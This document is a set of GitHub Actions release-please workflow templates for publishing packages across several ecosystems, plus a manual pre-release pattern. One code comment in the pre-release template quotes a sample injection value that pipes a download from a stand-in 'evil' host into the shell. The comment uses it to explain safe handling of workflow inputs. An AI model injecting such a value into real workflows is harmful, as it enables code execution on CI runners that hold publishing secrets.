# Workflow Templates

## Table of Contents

1. [Node.js → npm (Public Registry)](#1-nodejs--npm-public-registry)
2. [Node.js → GitHub Packages (Scoped)](#2-nodejs--github-packages-scoped)
3. [Python → PyPI (Trusted Publishers)](#3-python--pypi-trusted-publishers)
4. [Java → Maven Central](#4-java--maven-central)
5. [Go (Tags Only)](#5-go-tags-only)
6. [Rust → crates.io](#6-rust--cratesio)
7. [Docker (Build + Push)](#7-docker-build--push)
8. [Monorepo (Multi-Package)](#8-monorepo-multi-package)
9. [Pre-Release Pattern (Manual Dispatch)](#9-pre-release-pattern-manual-dispatch)

---

Copy-paste templates for each ecosystem. All templates include the config and manifest files needed alongside the workflow.

Every template incorporates these best practices:
- Concurrency groups to prevent duplicate runs
- Minimal permissions (principle of least privilege)
- Publish step gated on `release_created` output
- Idempotent publish check where applicable

---

## 1. Node.js → npm (Public Registry)

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "packages": {
    ".": {
      "release-type": "node",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true,
      "draft": false,
      "prerelease": false
    }
  }
}
```

### .release-please-manifest.json

```json
{
  ".": "0.0.0"
}
```

---

## 2. Node.js → GitHub Packages (Scoped)

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          registry-url: https://npm.pkg.github.com
      - run: npm ci

      # Idempotent: skip if version already published
      - name: Check if version exists
        id: check
        run: |
          PACKAGE_NAME=$(node -p "require('./package.json').name")
          VERSION=$(node -p "require('./package.json').version")
          if npm view "${PACKAGE_NAME}@${VERSION}" version 2>/dev/null; then
            echo "exists=true" >> "$GITHUB_OUTPUT"
          else
            echo "exists=false" >> "$GITHUB_OUTPUT"
          fi
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - if: steps.check.outputs.exists == 'false'
        run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Note:** Ensure your `package.json` has the `publishConfig` for GitHub Packages:

```json
{
  "name": "@your-org/your-package",
  "publishConfig": {
    "registry": "https://npm.pkg.github.com"
  }
}
```

### Config and manifest: same as Node.js → npm above.

---

## 3. Python → PyPI (Trusted Publishers)

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    environment: pypi
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install build
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@release/v1
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "packages": {
    ".": {
      "release-type": "python",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true
    }
  }
}
```

### .release-please-manifest.json

```json
{
  ".": "0.0.0"
}
```

---

## 4. Java → Maven Central

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 21
          server-id: ossrh
          server-username: MAVEN_USERNAME
          server-password: MAVEN_PASSWORD
          gpg-private-key: ${{ secrets.GPG_PRIVATE_KEY }}
          gpg-passphrase: GPG_PASSPHRASE
      - run: mvn -B deploy -Prelease
        env:
          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}
          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "packages": {
    ".": {
      "release-type": "java",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true,
      "extra-files": ["pom.xml"]
    }
  }
}
```

---

## 5. Go (Tags Only)

Go modules use git tags for versioning — no publish step needed.

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    steps:
      - uses: googleapis/release-please-action@v4
        id: release
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "packages": {
    ".": {
      "release-type": "go",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true
    }
  }
}
```

### Optional: GoReleaser Integration

Add a publish job that triggers GoReleaser on release:

```yaml
  goreleaser:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - uses: goreleaser/goreleaser-action@v6
        with:
          args: release --clean
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## 6. Rust → crates.io

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo publish
        env:
          CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "packages": {
    ".": {
      "release-type": "rust",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true
    }
  }
}
```

---

## 7. Docker (Build + Push)

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  docker:
    needs: release-please
    if: needs.release-please.outputs.release_created == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - uses: docker/metadata-action@v5
        id: meta
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=semver,pattern={{version}},value=${{ needs.release-please.outputs.version }}
            type=semver,pattern={{major}}.{{minor}},value=${{ needs.release-please.outputs.version }}
            type=raw,value=latest

      - uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
```

Use the `node` or `simple` release type depending on your project.

---

## 8. Monorepo (Multi-Package)

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      releases_created: ${{ steps.release.outputs.releases_created }}
      paths_released: ${{ steps.release.outputs.paths_released }}
      # Per-package outputs (add as needed)
      core-release: ${{ steps.release.outputs['packages/core--release_created'] }}
      core-version: ${{ steps.release.outputs['packages/core--version'] }}
      cli-release: ${{ steps.release.outputs['packages/cli--release_created'] }}
      cli-version: ${{ steps.release.outputs['packages/cli--version'] }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  publish-core:
    needs: release-please
    if: needs.release-please.outputs.core-release == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - working-directory: packages/core
        run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

  publish-cli:
    needs: release-please
    if: needs.release-please.outputs.cli-release == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - working-directory: packages/cli
        run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### release-please-config.json

```json
{
  "$schema": "https://raw.githubusercontent.com/googleapis/release-please/main/schemas/config.json",
  "separate-pull-requests": false,
  "packages": {
    "packages/core": {
      "release-type": "node",
      "component": "core",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true
    },
    "packages/cli": {
      "release-type": "node",
      "component": "cli",
      "changelog-path": "CHANGELOG.md",
      "bump-minor-pre-major": true
    }
  }
}
```

### .release-please-manifest.json

```json
{
  "packages/core": "0.0.0",
  "packages/cli": "0.0.0"
}
```

---

## 9. Pre-Release Pattern (Manual Dispatch)

This pattern supports both automatic stable releases and manual pre-releases via `workflow_dispatch`. Based on a production-proven workflow.

### .github/workflows/release.yml

```yaml
name: Release

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      prerelease:
        description: "Pre-release identifier (e.g., alpha.1, beta.2, rc.1). Leave empty for dry run."
        required: false
        type: string

# Least privilege: each job asks only for what it needs.
permissions:
  contents: read

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  # === Automatic release (push to main) ===
  release-please:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
      version: ${{ steps.release.outputs.version }}
    steps:
      - uses: googleapis/release-please-action@v4
        id: release

  # === Manual pre-release (workflow_dispatch) ===
  manual-release:
    if: github.event_name == 'workflow_dispatch' && inputs.prerelease != ''
    runs-on: ubuntu-latest
    permissions:
      contents: write
    outputs:
      version: ${{ steps.version.outputs.version }}
      tag_name: ${{ steps.version.outputs.tag_name }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22

      - name: Compute pre-release version
        id: version
        # Pass the input through env, never ${{ }} inside run: — a value like
        # `a"; curl evil | sh; "` would otherwise run as shell code.
        env:
          PRERELEASE: ${{ inputs.prerelease }}
        run: |
          if [[ ! "$PRERELEASE" =~ ^[0-9A-Za-z]+(\.[0-9A-Za-z]+)*$ ]]; then
            echo "::error::prerelease must look like alpha.1, beta.2 or rc.1"
            exit 1
          fi
          BASE_VERSION=$(node -p "require('./package.json').version")
          VERSION="${BASE_VERSION}-${PRERELEASE}"
          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
          echo "tag_name=v${VERSION}" >> "$GITHUB_OUTPUT"
          echo "Pre-release version: ${VERSION}"

      - name: Create pre-release tag and GitHub release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.version.outputs.tag_name }}
          VERSION: ${{ steps.version.outputs.version }}
        run: |
          git tag "$TAG"
          git push origin "$TAG"
          gh release create "$TAG" \
            --title "v${VERSION}" \
            --notes "Pre-release v${VERSION}" \
            --prerelease

  # === Publish (runs after either release type) ===
  publish:
    needs: [release-please, manual-release]
    if: |
      always() && (
        needs.release-please.outputs.release_created == 'true' ||
        (needs.manual-release.result == 'success' && needs.manual-release.outputs.version != '')
      )
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release-please.outputs.tag_name || needs.manual-release.outputs.tag_name }}
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          registry-url: https://npm.pkg.github.com

      - name: Resolve version and tag
        id: resolve
        env:
          VERSION: ${{ needs.release-please.outputs.version || needs.manual-release.outputs.version }}
        run: |
          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
          if [[ "$VERSION" == *-* ]]; then
            echo "npm_tag=next" >> "$GITHUB_OUTPUT"
          else
            echo "npm_tag=latest" >> "$GITHUB_OUTPUT"
          fi

      - run: npm ci

      # Idempotent: skip if version already published
      - name: Check if version exists
        id: check
        run: |
          PACKAGE_NAME=$(node -p "require('./package.json').name")
          if npm view "${PACKAGE_NAME}@${VERSION}" version 2>/dev/null; then
            echo "exists=true" >> "$GITHUB_OUTPUT"
          else
            echo "exists=false" >> "$GITHUB_OUTPUT"
          fi
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ steps.resolve.outputs.version }}

      # Stable tags already carry the version in package.json; --allow-same-version keeps npm from refusing it.
      - if: steps.check.outputs.exists == 'false'
        run: |
          npm version "$VERSION" --no-git-tag-version --allow-same-version
          npm publish --tag "$NPM_TAG"
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ steps.resolve.outputs.version }}
          NPM_TAG: ${{ steps.resolve.outputs.npm_tag }}
```

### Usage

- **Stable releases:** Push conventional commits to `main` → release-please creates a PR → merge the PR → publish runs automatically
- **Pre-releases:** Go to Actions → Release → Run workflow → Enter identifier like `alpha.1`, `beta.2`, or `rc.1`
- **npm tags:** Stable versions get `latest`, pre-releases get `next`

Adapt the publish step for your registry (npm, GitHub Packages, PyPI, etc.).
